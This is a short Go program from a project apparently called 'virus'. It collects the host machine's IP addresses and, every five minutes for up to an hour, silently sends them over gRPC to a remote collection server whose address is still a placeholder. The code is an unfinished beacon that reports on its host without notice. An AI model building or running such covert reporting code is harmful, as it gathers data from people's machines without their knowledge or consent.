package main

import (
	"context"
	"fmt"
	"time"

	uuid "github.com/satori/go.uuid"
	"google.golang.org/grpc"

	"github.com/kolya59/virus/pkg/machine"
	pb "github.com/kolya59/virus/proto"
)

var (
	interval = 5 * time.Minute
	timeout  = 60 * time.Minute
)

func sendData(machine machine.Machine, done chan interface{}) {
	// Convert to grpc
	converted := machine.ToGRPC()

	// Generate uuid
	converted.Uuid = uuid.NewV4().String()

	// TODO Get host and port
	// Set up a connection to the server.
	conn, err := grpc.Dial(fmt.Sprintf("%s:%s", "host", "port"), grpc.WithInsecure(), grpc.WithBlock())
	if err != nil {
		return
	}
	defer conn.Close()
	c := pb.NewWorkerSaverClient(conn)

	// Save cars
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	r, err := c.SaveMachine(ctx, &pb.SaveMachineReq{Machine: converted})
	if err != nil {
		return
	}

	if r.Status != pb.SaveMachineRes_ACCEPTED {
		close(done)
	}
}

func main() {
	m := machine.Machine{}
	m.GetIPS()

	done := make(chan interface{})
	ticker := time.NewTicker(interval)
	timer := time.NewTimer(timeout)

	for {
		select {
		case <-ticker.C:
			sendData(m, done)
		case <-timer.C:
			return
		case <-done:
			return
		}
	}
}
